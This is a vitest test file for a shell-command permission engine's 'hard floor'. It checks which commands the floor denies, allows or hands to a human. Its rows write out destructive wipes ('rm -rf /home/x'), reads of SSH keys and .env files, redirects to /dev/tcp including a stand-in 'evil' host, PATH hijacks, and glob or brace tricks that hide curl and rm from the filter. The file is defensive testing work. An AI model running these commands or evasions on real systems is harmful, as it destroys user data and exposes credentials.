import { describe, it, expect, beforeAll } from 'vitest';
import type { ParsedCommand, PermissionRequest, PermissionRule } from '@minitui/types';
import { createEngine } from '../../src/permission/engine.js';
import { ensureParserReady } from '../../src/permission/shell/parser.js';
import { parseShellCommand } from '../../src/permission/shell/roots.js';
import { storeDir } from '../../src/permission/secret-paths.js';
import {
  checkHardFloor,
  foldsCase,
  globMatcher,
  homeRoots,
} from '../../src/permission/hard-floor.js';

beforeAll(async () => {
  await ensureParserReady();
});

type Kind = 'allow' | 'deny' | 'ask';
type Host = { readonly home: string; readonly platform: string; readonly store: string };

// A host with the default store directory (no store variable set), the one the floor used to read itself.
const hostAt = (home: string, platform: string): Host => ({
  home,
  platform,
  store: storeDir({}, home),
});

const linuxHost: Host = hostAt('/home/erkin', 'linux');
const rootHost: Host = hostAt('/root', 'linux');
const darwinHost: Host = hostAt('/Users/t', 'darwin');
const win32Host: Host = hostAt('C:\\Users\\t', 'win32');

let counter = 0;
const request = (command: string): PermissionRequest => ({
  id: `fl${counter++}`,
  descriptor: { danger: false, resourceTemplate: command, summaryTemplate: command },
  resolvedCommand: command,
  resolvedPaths: [],
});

const nameGrants = (...names: string[]): PermissionRule[] =>
  names.map((pattern) => ({ pattern, effect: 'allow', layer: 'user' }));

async function verdictOf(
  command: string,
  mode: 'yolo' | 'default',
  rules: PermissionRule[] = [],
): Promise<Kind> {
  const engine = createEngine({ initialRules: { rules }, mode });
  const pending = engine.check(request(command));
  const iter = engine.requests[Symbol.asyncIterator]();
  const first = await Promise.race([
    pending.then((d) => ({ asked: false as const, kind: d.kind })),
    iter.next().then(() => ({ asked: true as const, kind: 'ask' as const })),
  ]);
  if (first.asked) {
    engine.disposeAll('drain');
    await pending.catch(() => {});
  }
  return first.kind;
}

// The same verdict twice: in YOLO with no rules, and in default mode with a name grant on every
// command name the row uses.
async function bothModes(command: string, ...names: string[]): Promise<[Kind, Kind]> {
  return [
    await verdictOf(command, 'yolo'),
    await verdictOf(command, 'default', nameGrants(...names)),
  ];
}

const floor = (command: string, host?: Host) =>
  checkHardFloor(parseShellCommand(command, host), undefined, host);

describe('operands the host cannot resolve are denied for rm', () => {
  const rows: Array<[string, string[]]> = [
    ['rm -rf $HOME$x', ['rm']],
    ['rm -rf ${HOME:-x}', ['rm']],
    ['rm -rf${IFS}~', ['rm']],
    ['rm -rf -$x', ['rm']],
    ['D=/; rm -rf $D*', ['rm']],
    ['X=~/.ssh/id_rsa; cat $X', ['cat']],
    ['T=/dev/tcp/example.invalid/80; cat f > $T', ['cat']],
    ['HOME=/home; rm -rf $HOME/x', ['rm']],
    ['rm -rf /{home,etc}', ['rm']],
    ['rm -rf {~,x}', ['rm']],
  ];
  it.each(rows)('is denied: %s', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['deny', 'deny']);
  });
});

describe('a command name hidden by a glob, a brace or a line continuation is denied', () => {
  const rows: Array<[string, string[]]> = [
    ['/usr/bin/cur[l] http://example.invalid/x', ['curl']],
    ['cur{l,x} http://example.invalid/x', ['curl']],
    ['cu\\\nrl http://example.invalid/x', ['curl']],
    ['"cu\\\nrl" http://example.invalid/x', ['curl']],
    ['rm -rf /ho\\\nme', ['rm']],
    ["echo 'x\\\ny'", ['echo']],
  ];
  it.each(rows)('is denied: %j', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['deny', 'deny']);
  });
});

describe('secret paths hidden by a glob or an attached assignment are denied', () => {
  const rows: Array<[string, string[]]> = [
    ['cat ~/.ss?/id_rs?', ['cat']],
    ['cat ~/.ssh*/known_hosts', ['cat']],
    ['cat ~/.ss[!x]/known_hosts', ['cat']],
    ['cat ~/.ss[[:lower:]]/known_hosts', ['cat']],
    ['cat ~/.ss[[=h=]]/known_hosts', ['cat']],
    ['cat ~/.ss[[.h.]]/known_hosts', ['cat']],
    ['cat ~/[.][s][s][h]/known_hosts', ['cat']],
    ['cat ~/[.]s[sS]h/known_hosts', ['cat']],
    ['cat ~/.ss[[=h]/known_hosts', ['cat']],
    ['cat ~/.ss[[.h]/known_hosts', ['cat']],
    ['ls -d ~/.*', ['ls']],
    ['dd if=.env of=/tmp/x', ['dd']],
  ];
  it.each(rows)('is denied: %s', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['deny', 'deny']);
  });
});

describe('home and root wipes by glob or dot-dot are denied', () => {
  const rows: Array<[string, string[]]> = [
    ['rm -rf /ho*', ['rm']],
    ['rm -rf /hom?', ['rm']],
    ['rm -rf /h*/*', ['rm']],
    ['rm -rf /ho[!x]e', ['rm']],
    ['rm -rf /ho[^x]e', ['rm']],
    ['rm -rf /ho[[:lower:]]e', ['rm']],
    ['rm -rf /ho[[=m=]]e', ['rm']],
    ['rm -rf /ho[[.m.]]e', ['rm']],
    ['rm -rf /h[a-z]me', ['rm']],
    ['rm -rf /ho[z-a]e', ['rm']],
    ['rm -rf /ho[[=m]e', ['rm']],
    ['rm -rf /ho[[.m]e', ['rm']],
    ['rm -rf /ho[[:alpha]e', ['rm']],
    ['rm -rf /Users', ['rm']],
    ['rm -rf /Users/*/', ['rm']],
    ['rm -rf ~/..', ['rm']],
    ['rm -rf $HOME/..', ['rm']],
    ['rm -rf ~/x/../..', ['rm']],
    ['rm -rf ~root/../home', ['rm']],
    ['rm -rf ~daemon/x/../../home', ['rm']],
  ];
  it.each(rows)('is denied: %s', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['deny', 'deny']);
  });
});

// Another account's home directory is a direct child of a directory that holds home directories:
// the parent of this host's home, /home and /Users. Deleting one is as catastrophic as deleting the
// user's own, so it is floored in every spelling that resolves to it, and only exactly one level
// below those parents: a subpath of another home is an ordinary path.
describe('the home directories beside the user own are denied for rm', () => {
  const denied = [
    'rm -rf ~/../x',
    'rm -rf ~/../x/',
    'rm -rf $HOME/../x',
    'rm -rf ${HOME}/../x',
    'rm -rf ~/y/../../x',
    'rm -rf /home/x',
    'rm -rf /home/x/',
    'rm -rf /home//x',
    'rm -rf /home/./x',
    'rm -rf /home/erkin/../x',
    'rm -rf /home/x/*',
    'rm -r -f /home/x',
    'rm -rf -- /home/x',
    'rm --recursive --force /home/x',
    'rm -rf /Users/x',
  ];
  it.each(denied)('is denied on a linux host: %s', (command) => {
    expect(floor(command, linuxHost).blocked).toBe(true);
  });

  // A glob that expands to a child of a parent directory is floored whatever component holds the
  // glob; a glob below that depth only reaches subpaths of another home.
  const globbed = [
    'rm -rf /ho*/x',
    'rm -rf /h*/x',
    'rm -rf /ho?e/x',
    'rm -rf /ho[m]e/x',
    'rm -rf /*/x',
    'rm -rf /ho*/x*',
    'rm -rf /Us*/x',
    'rm -rf /home/x*',
    'rm -rf ~/../x*',
    'rm -rf /tmp/../ho*',
    'rm -rf /tmp/../ho*/x',
    'rm -rf ~/../../ho*/x',
    'rm -rf $HOME/../../h?me/x',
    'rm -rf /home/erkin/../../ho*/x',
    'rm -rf /ho*/../ho*/x',
    'rm -rf ~/.?/x',
    'rm -rf ~/.*/x',
    'rm -rf /home/erkin/.?/x',
    'rm -rf ~/.[.]/x',
    'rm -rf $HOME/.*/erkin',
    'rm -rf /tmp/.?',
    'rm -rf /tmp/.?/home/x',
    'rm -rf /tmp/.*/home/x',
    'rm -rf /var/.?/.?/home/x',
    'rm -rf /tmp/.[.]/home/x',
    'rm -rf /tmp/[.]?/home/x',
    'rm -rf ~/../*',
  ];
  it.each(globbed)('is denied when a glob expands to it: %s', (command) => {
    expect(floor(command, linuxHost).blocked).toBe(true);
  });

  it.each([
    'rm -rf /ho*/x/docs',
    'rm -rf /t*/x',
    'rm -rf /home/erkin/b*/x',
    'rm -rf /home/erkin/b*',
    'rm -rf /tmp/.hidden*/x',
    'rm -rf /tmp/..x*/y',
    'rm -rf /home/erkin/.cache*',
    'rm -rf /home/erkin/build/*.log',
    'rm -rf /tmp/../t*/x',
    'rm -rf ~/b*/../c',
    'rm -rf ~/x*/../docs',
    'rm -rf ~/b*/x',
  ])('keeps a glob below that depth allowed: %s', (command) => {
    expect(floor(command, linuxHost).blocked).toBe(false);
  });

  it('does not floor the children of the user own home when that home is itself /home', () => {
    const bare: Host = hostAt('/home', 'linux');
    expect(floor('rm -rf /home/x', bare).blocked).toBe(false);
    expect(floor('rm -rf /home', bare).blocked).toBe(true);
    expect(floor('rm -rf /Users/x', bare).blocked).toBe(true);
  });

  it('is denied through the engine in both modes by an absolute spelling', async () => {
    expect(await bothModes('rm -rf /home/x', 'rm')).toEqual(['deny', 'deny']);
    expect(await bothModes('rm -rf /Users/x', 'rm')).toEqual(['deny', 'deny']);
  });

  it('floors the literal parents on a host whose home is /root', () => {
    expect(floor('rm -rf /home/x', rootHost).blocked).toBe(true);
    expect(floor('rm -rf /Users/x', rootHost).blocked).toBe(true);
  });

  it('floors a sibling of a home that sits outside /home and /Users', () => {
    const srvHost: Host = hostAt('/srv/people/erkin', 'linux');
    expect(floor('rm -rf /srv/people/bob', srvHost).blocked).toBe(true);
    expect(floor('rm -rf ~/../bob', srvHost).blocked).toBe(true);
    expect(floor('rm -rf /srv/people/bob/build', srvHost).blocked).toBe(false);
  });

  it('folds case on a darwin host and not on a linux host', () => {
    expect(floor('rm -rf /users/X', darwinHost).blocked).toBe(true);
    expect(floor('rm -rf /USERS/x', darwinHost).blocked).toBe(true);
    expect(floor('rm -rf /users/x', linuxHost).blocked).toBe(false);
  });

  it('floors a shared directory under the parent too (recorded cost)', () => {
    expect(floor('rm -rf /Users/Shared', darwinHost).blocked).toBe(true);
    expect(floor('rm -rf /home/shared', linuxHost).blocked).toBe(true);
  });

  const allowed = [
    'rm -rf ~/../x/docs',
    'rm -rf ~/../x/../y/docs',
    'rm -rf /home/x/docs',
    'rm -rf /home/x/docs/',
    'rm -rf /home/erkin/build',
    'rm -rf ~/x',
    'rm -rf /tmp/x',
    'rm -rf /srv/x',
    'rm -rf /x',
  ];
  it.each(allowed)('keeps a subpath or an unrelated directory allowed: %s', (command) => {
    expect(floor(command, linuxHost).blocked).toBe(false);
  });
});

describe('the floor knows the host', () => {
  it('floors /home on a host whose home is /root (a guard: the literal is always in the set)', () => {
    expect(floor('rm -rf /home', rootHost).blocked).toBe(true);
  });
  it('reads each path component of a glob on its own', () => {
    // an irregular bracket never reaches across a separator, so the components after it still count
    expect(floor('rm -rf /ho[[:lower:]]e/[e]rkin', linuxHost).blocked).toBe(true);
    expect(floor('rm -rf /ho[[=m=]]e/e[r]kin', linuxHost).blocked).toBe(true);
    expect(floor('rm -rf /ho[[:lower:]]e/[x]rkin/build', linuxHost).blocked).toBe(false);
  });
  it('floors glob forms of the home directory on a linux host', () => {
    expect(floor('rm -rf /home/erki*', linuxHost).blocked).toBe(true);
    expect(floor('rm -rf ~/../erkin', linuxHost).blocked).toBe(true);
  });
  it('floors /Users on a darwin host in either case', () => {
    expect(floor('rm -rf /Users', darwinHost).blocked).toBe(true);
    expect(floor('rm -rf /users', darwinHost).blocked).toBe(true);
  });
  it('folds case in the wrapper peel and the egress name on a darwin host', () => {
    expect(floor('SUDO rm -rf /', darwinHost).blocked).toBe(true);
    expect(floor('CURL http://example.invalid/x', darwinHost).blocked).toBe(true);
  });
  it('treats an upper-case shell as a spawner on a darwin host only', () => {
    expect(parseShellCommand('BASH -c x', darwinHost).roots[0]?.opaque).toBe(true);
    expect(parseShellCommand('BASH -c x', linuxHost).roots[0]?.opaque).not.toBe(true);
  });
  it('folds the characters a case-insensitive file system joins to ASCII letters', () => {
    // U+017F (long s) is the same name as `s` on such a file system
    expect(floor('\u017fudo rm -rf /', darwinHost).blocked).toBe(true);
    expect(floor('\u017fcp a h:b', darwinHost).blocked).toBe(true);
    expect(floor('rm -rf /\u017fers', darwinHost).blocked).toBe(false);
    expect(floor('rm -rf /U\u017fer\u017f', darwinHost).blocked).toBe(true);
    expect(floor('\u017fudo rm -rf /', linuxHost).blocked).toBe(false);
  });
  it('folds case on darwin and win32 and not on linux', () => {
    expect(foldsCase('darwin')).toBe(true);
    expect(foldsCase('win32')).toBe(true);
    expect(foldsCase('linux')).toBe(false);
    expect(floor('SUDO rm -rf /', win32Host).blocked).toBe(true);
  });
  it('floors the parent of a home directory that sits outside /home and /Users', () => {
    const srvHost: Host = hostAt('/srv/people/erkin', 'linux');
    expect(floor('rm -rf /srv/people', srvHost).blocked).toBe(true);
    expect(floor('rm -rf /srv/people/erkin', srvHost).blocked).toBe(true);
    expect(floor('rm -rf /srv/people/erkin/build', srvHost).blocked).toBe(false);
    expect([...homeRoots('/srv/people/erkin', 'linux')].sort()).toEqual([
      '/Users',
      '/home',
      '/srv/people',
      '/srv/people/erkin',
    ]);
  });
  it('folds case for a hand-built root too, by the host and not by the root', () => {
    const handBuilt = (name: string, argv: string[]): ParsedCommand => ({
      raw: 'x',
      roots: [{ name, argv }],
      hasSubstitution: false,
      parseError: false,
    });
    const upperEgress = handBuilt('CURL', ['CURL', 'http://example.invalid/x']);
    const upperRm = handBuilt('RM', ['RM', '-rf', '/']);
    expect(checkHardFloor(upperEgress, undefined, darwinHost).blocked).toBe(true);
    expect(checkHardFloor(upperEgress, undefined, linuxHost).blocked).toBe(false);
    expect(checkHardFloor(upperRm, undefined, darwinHost).blocked).toBe(true);
    expect(checkHardFloor(upperRm, undefined, linuxHost).blocked).toBe(false);
  });
  it('lists the home, its parent and the two literal parents', () => {
    expect([...homeRoots('/home/erkin', 'linux')].sort()).toEqual([
      '/Users',
      '/home',
      '/home/erkin',
    ]);
    expect([...homeRoots('/root', 'linux')].sort()).toEqual(['/Users', '/home', '/root']);
    expect([...homeRoots('/Users/t', 'darwin')].sort()).toEqual(['/Users', '/Users/t', '/home']);
  });
});

describe('what cannot be resolved reaches the human', () => {
  const rows: Array<[string, string[]]> = [
    ['PATH=/tmp/evil ffmpeg -i a.mp4 b.mp4', ['ffmpeg']],
    ['ls *.mp4', ['ls']],
    ['echo $USER', ['echo']],
    ['ls ~/Videos/*', ['ls']],
    ['rm -rf ../../home', ['rm']],
    ['rm -rf ../build', ['rm']],
    ['rm -rf /ho[ab]e', ['rm']],
    ['rm -rf /ho[ab', ['rm']],
    ['rm -rf /ho[ab][cd]e', ['rm']],
    ['ls ~/Videos/[!.]*', ['ls']],
    ['ls ~/[a-z]*', ['ls']],
    ['ls ~/[[:alpha:]]*', ['ls']],
    ['ls ~/[0-9][0-9]', ['ls']],
    ['ls ~/[abcdef]*', ['ls']],
    ['ls ~/[a-d]*', ['ls']],
    ['rm -rf /ho[a\\]m]e', ['rm']],
    ['cat ~/.ss[\\h]/known_hosts', ['cat']],
    ['env PATH=/tmp/evil ffmpeg -i a.mp4 b.mp4', ['env', 'ffmpeg']],
    ['sudo PATH=/tmp/evil ffmpeg -i a.mp4 b.mp4', ['sudo', 'ffmpeg']],
  ];
  it.each(rows)('asks and no grant covers it: %s', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['ask', 'ask']);
  });

  it('a plain env assignment asks under YOLO (recorded cost)', async () => {
    expect(await verdictOf('env FOO=1 ffmpeg -i a.mp4 b.mp4', 'yolo')).toBe('ask');
  });
});

describe('forms that keep the verdict they had (controls)', () => {
  it.each([
    ['rm -rf build', ['rm']],
    ['ffmpeg -i a.mp4 b.mp4', ['ffmpeg']],
    ["ls '*.mp4'", ['ls']],
    [
      "ffmpeg -i a.mp4 -i b.mp4 -filter_complex '[0:v][1:v]concat=n=2:v=1[v]' -map '[v]' out.mp4",
      ['ffmpeg'],
    ],
  ] as Array<[string, string[]]>)('allowed: %s', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['allow', 'allow']);
  });

  it('allows rm of a path under another user home name that is not a whole home', async () => {
    expect(await verdictOf('rm -rf ~root/tmp/x', 'yolo')).toBe('allow');
  });

  it('allows env with a plain inner command once both names are granted', async () => {
    expect(
      await verdictOf('env ffmpeg -i a.mp4 b.mp4', 'default', nameGrants('env', 'ffmpeg')),
    ).toBe('allow');
  });

  it('the exec-time re-gate shape, literal brackets and no opaque marker, is not blocked', () => {
    const regate: ParsedCommand = {
      raw: 'x',
      roots: [
        {
          name: 'ffmpeg',
          argv: ['ffmpeg', '-filter_complex', '[0:v][1:v]concat=n=2[v]', 'out.mp4'],
        },
      ],
      hasSubstitution: false,
      parseError: false,
    };
    expect(checkHardFloor(regate).blocked).toBe(false);
  });
});

describe('the exported floor refuses what it was handed unparsed', () => {
  it('blocks a parse error', () => {
    expect(
      checkHardFloor({ raw: 'x', roots: [], hasSubstitution: false, parseError: true }).blocked,
    ).toBe(true);
  });
  it('blocks a substitution result', () => {
    expect(
      checkHardFloor({ raw: 'x', roots: [], hasSubstitution: true, parseError: false }).blocked,
    ).toBe(true);
  });
  it('a device path is refused with one phrase that holds no part of the command', () => {
    const lone = floor('x > /dev/tcp/h/1');
    const other = floor('cat x > /dev/tcp/evil/80');
    expect(lone.blocked).toBe(true);
    expect(lone.reason).toBe(other.reason);
    expect(lone.reason).not.toContain('x');
    expect(lone.reason).not.toContain('cat');
  });
});

// Wall-clock cost of the floor alone. The command is parsed, and the floor warmed once, before the clock
// starts, so only the glob work is timed. Only `Date` is frozen in tests; `performance.now` is real.
const alice: Host = hostAt('/home/alice', 'linux');

function timedFloor(
  parsed: ParsedCommand,
  paths: readonly string[],
  host: Host,
): { readonly ms: number; readonly blocked: boolean } {
  // the fastest of three runs: contention and a cold first call only slow a run, never speed it up
  const start = performance.now();
  const verdict = checkHardFloor(parsed, paths, host);
  let best = performance.now() - start;
  for (let i = 1; i < 3; i++) {
    const again = performance.now();
    checkHardFloor(parsed, paths, host);
    best = Math.min(best, performance.now() - again);
  }
  return { ms: best, blocked: verdict.blocked };
}

describe('the floor glob match is bounded work', () => {
  const stars = (count: number): string => '*'.repeat(count);

  beforeAll(() => {
    checkHardFloor(parseShellCommand('ls x', alice), [], alice);
  });

  it('decides an argv token of sixteen stars and a letter no name holds in under 50 ms', () => {
    const parsed = parseShellCommand(`cat ~/.${stars(16)}Z`, alice);
    const { ms, blocked } = timedFloor(parsed, [], alice);
    expect(ms).toBeLessThan(50);
    expect(blocked).toBe(false);
  });

  it('decides a resolved path of fourteen stars and a letter no name holds in under 50 ms', () => {
    const parsed = parseShellCommand('ls x', alice);
    const { ms, blocked } = timedFloor(parsed, [`/home/alice/.${stars(14)}Z`], alice);
    expect(ms).toBeLessThan(50);
    expect(blocked).toBe(false);
  });

  it('decides an rm operand of two hundred stars and a letter no name holds in under 50 ms', () => {
    const parsed = parseShellCommand(`rm -rf /h${stars(200)}Z`, alice);
    const { ms, blocked } = timedFloor(parsed, [], alice);
    expect(ms).toBeLessThan(50);
    expect(blocked).toBe(false);
  });

  // The consent size budget: 32 resolved paths of 1,024 characters, almost all stars. Written once the
  // matcher was bounded: against the backtracking form this row does not return.
  it('decides the consent size budget of star-heavy resolved paths, and the cost grows at most quadratically with their length', () => {
    const pathsOf = (length: number): string[] =>
      Array.from({ length: 32 }, () => `/home/alice/.${stars(length - 14)}Z`);
    expect(pathsOf(1024)[0]?.length).toBe(1024);
    const parsed = parseShellCommand('ls x', alice);
    expect(timedFloor(parsed, pathsOf(1024), alice).blocked).toBe(false);
    // A match is stars x subject characters, so doubling the length costs about four times as much; the
    // bound allows three times that. The ratio, not an absolute time, because a busy machine slows both
    // lengths alike (the absolute time was 200 ms under coverage, against a 1,000 ms bound).
    const costOf = (length: number): number => timedFloor(parsed, pathsOf(length), alice).ms;
    expect(costOf(1024) / Math.max(costOf(512), 0.2)).toBeLessThan(12);
  });

  // The verdict of every glob form the floor already judged does not move.
  it.each([
    ['cat ~/.ss?/id_rs?', true],
    ['cat ~/.ssh*/x', true],
    ['cat ~/.net*', true],
    ['cat ~/.confi?/gh', true],
    ['cat ~/.s[s]h/id_rsa', true],
    ['cat ~/.s[!x]h/id_rsa', true],
    ['cat ~/.[a-z]sh/id_rsa', true],
    ['rm -rf /ho*', true],
    ['rm -rf /ho*/x', true],
    ['rm -rf /h?me/x*', true],
    ['rm -rf /home/erki*', true],
    ['rm -rf /[h]ome', true],
    ['rm -rf /ho[m]e/erk*', true],
    ['rm -rf /*', true],
    ['rm -rf ~/*', true],
    ['cat ~/.config/*', false],
    ['ls ~/Videos/*', false],
    ['rm -rf /tmp/h*', false],
  ] as const)('keeps the verdict of %s', (command, expected) => {
    expect(floor(command, linuxHost).blocked).toBe(expected);
  });
});

describe('the glob matcher reads one path component per star', () => {
  it('lets a star stand for any run of characters inside one component', () => {
    expect(globMatcher('/ho*/x', false)('/home/x')).toBe(true);
    expect(globMatcher('/ho*', false)('/home')).toBe(true);
    expect(globMatcher('*', false)('')).toBe(true);
  });
  it('never lets a star or a question mark cross a separator', () => {
    expect(globMatcher('/ho*/x', false)('/home/a/x')).toBe(false);
    expect(globMatcher('*', false)('a/b')).toBe(false);
    expect(globMatcher('a?b', false)('a/b')).toBe(false);
  });
  it('reads a set as the characters it lists and a negated set as any one character', () => {
    expect(globMatcher('.s[s]h', false)('.ssh')).toBe(true);
    expect(globMatcher('.s[s]h', false)('.sxh')).toBe(false);
    expect(globMatcher('.s[!x]h', false)('.sqh')).toBe(true);
  });
  it('folds case only when it is told to', () => {
    expect(globMatcher('H*', true)('home')).toBe(true);
    expect(globMatcher('H*', false)('home')).toBe(false);
  });
});

// The floor has no working-directory model. A relative rm operand in a command that also changes
// directory, or that runs under a wrapper option which sets the working directory or the root, names a
// place the host cannot see, so that rm asks in every mode (an opaque root), as a relative `..` already does.
describe('a relative delete after a change of directory or root asks', () => {
  it.each([
    ['cd / && rm -rf home', ['cd', 'rm']],
    ['pushd / && rm -rf home', ['pushd', 'rm']],
    ['cd ~/.. && rm -rf alice', ['cd', 'rm']],
    ['cd / ; rm -rf -- home', ['cd', 'rm']],
    ['builtin cd / && rm -rf home', ['builtin', 'rm']],
    ['rm -rf home; cd /', ['rm', 'cd']],
    ['cd build && rm -rf out', ['cd', 'rm']],
  ] as const)('asks for %s in YOLO and under a grant for every name', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['ask', 'ask']);
  });

  it.each([
    ['env -C / rm -rf home', ['env', 'rm']],
    ['env --chdir=/ rm -rf home', ['env', 'rm']],
    ['env --chdir / rm -rf home', ['env', 'rm']],
    ['sudo -D / rm -rf home', ['sudo', 'rm']],
    ['sudo --chdir=/ rm -rf home', ['sudo', 'rm']],
    ['unshare --wd=/ rm -rf home', ['unshare', 'rm']],
    ['unshare -w / rm -rf home', ['unshare', 'rm']],
    ['sudo -R / rm -rf home', ['sudo', 'rm']],
    ['sudo --chroot=/ rm -rf home', ['sudo', 'rm']],
    ['unshare -R / rm -rf home', ['unshare', 'rm']],
    ['unshare --root=/ rm -rf home', ['unshare', 'rm']],
  ] as const)('asks for %s in YOLO and under a grant for every name', async (command, names) => {
    expect(await bothModes(command, ...names)).toEqual(['ask', 'ask']);
  });

  // Controls: these keep the verdict they have today.
  it.each([
    ['rm -rf build', ['rm'], ['allow', 'allow']],
    ['env -i rm -rf build', ['env', 'rm'], ['allow', 'allow']],
    ['sudo -u root rm -rf build', ['sudo', 'rm'], ['allow', 'allow']],
    ['sudo -C 3 rm -rf build', ['sudo', 'rm'], ['allow', 'allow']],
    ['env -C / ls home', ['env', 'ls'], ['allow', 'allow']],
    ['cat notes.txt', ['cat'], ['allow', 'allow']],
    ['rm -rf /home', ['rm'], ['deny', 'deny']],
    ['cd ~ && rm -rf /home', ['cd', 'rm'], ['deny', 'deny']],
    ['env -C / rm -rf /home', ['env', 'rm'], ['deny', 'deny']],
    ['sudo -R / rm -rf /home', ['sudo', 'rm'], ['deny', 'deny']],
  ] as const)('keeps the verdict of %s', async (command, names, expected) => {
    expect(await bothModes(command, ...names)).toEqual(expected);
  });
});
